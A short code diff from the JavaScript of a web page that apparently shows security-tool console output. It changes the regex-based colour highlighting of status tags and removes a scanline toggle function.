-        .replace(/(\[\!\])/g, '<span style="color: #f87171; font-weight: bold;">$1</span>')
+        .replace(/\\n/g, '<br>')
+        .replace(/(\\[\\+\\])/g, '<span style="color: #34d399; font-weight: bold;">$1</span>')
+        .replace(/(\\[\\*\\])/g, '<span style="color: #38bdf8; font-weight: bold;">$1</span>')
+        .replace(/(\\[\\!\\])/g, '<span style="color: #f87171; font-weight: bold;">$1</span>')
         .replace(/(-->)/g, '<span style="color: #fbbf24; font-weight: bold;">$1</span>')
         .replace(/(CRITICAL|HIGH RISK|VULNERABILITY CONFIRMED)/g, '<strong style="color: #ef4444;">$1</strong>');
     }
@@ -4796,11 +5202,6 @@
       `).join('');
     }
 
-    function toggleScanlines() {
-      scanlinesEnabled = !scanlinesEnabled;
-      renderDossierConsole();
-    }
-
     function copyArsenalCmd(cmd, btn) {
       navigator.clipboard.writeText(cmd).then(() => {
         const originalHtml = btn.innerHTML;
@@ -4840,6 +5241,7 @@
       renderArsenalDeck();
       renderDossierConsole();
     });
+
   </script>
 
 </body>
